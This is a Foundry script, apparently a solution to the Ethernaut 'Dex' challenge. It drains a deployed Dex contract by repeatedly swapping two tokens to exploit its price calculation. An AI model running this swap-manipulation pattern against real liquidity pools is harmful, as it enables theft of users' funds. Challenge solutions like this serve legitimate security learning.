// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Dex.sol";
import "../src/Dex_exp.sol";
import {console, Script} from "forge-std/Script.sol";

contract DexScript is Script{
    uint256 public deployer ;
    Dex_exp dex_exp;
    Dex dex;
    address token1;
    address token2;


    function setUp() public {
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY_2");

        // vm.startBroadcast(deployer);
        // dex = new Dex();
        // token1 = new SwappableToken(address(dex), "token1", "token1", 1000);
        // token2 = new SwappableToken(address(dex), "token2", "token2", 1000);
        // dex.setTokens(address(token1), address(token2));
        // dex.approve(address(dex), 1000);
        // dex.addLiquidity(address(token1), 100);
        // dex.addLiquidity(address(token2), 100);
        // vm.stopBroadcast();

    }

    function run() public {
        // deployer = vm.envUint("ANVIL_PRIVATE_KEY");
        deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);
        dex = Dex(address(0x07959073F93D728E4e639e67E4f100BA999F9040));
        
        token1 = dex.token1();
        token2 = dex.token2();
        dex.approve(address(dex), 1000);
        // dex.balanceOf(address(token1), address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266));
        // dex.balanceOf(address(token2), address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266));
        // address player = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
        address player = address(0x3CeE531D7d776D3370484A881bE380dEa317af9e);
        dex.swap(address(token1), address(token2), 10);
        uint num1 = dex.balanceOf(address(token2), player);
        dex.swap(address(token2), address(token1), num1);
        uint num2 = dex.balanceOf(address(token1), player);
        dex.swap(address(token1), address(token2), num2);
        uint num3 = dex.balanceOf(address(token2), player);
        dex.swap(address(token2), address(token1), num3);
        uint num4 = dex.balanceOf(address(token1), player);
        dex.swap(address(token1), address(token2), num4);
        dex.swap(address(token2), address(token1), 45);

        uint t1 = dex.balanceOf(address(token1), address(dex));
        uint t2 = dex.balanceOf(address(token2), address(dex));
        console.log("Token1 Dex balance: ", t1);
        console.log("Token2 Dex balance: ", t2);

        vm.stopBroadcast(); 
    }

}
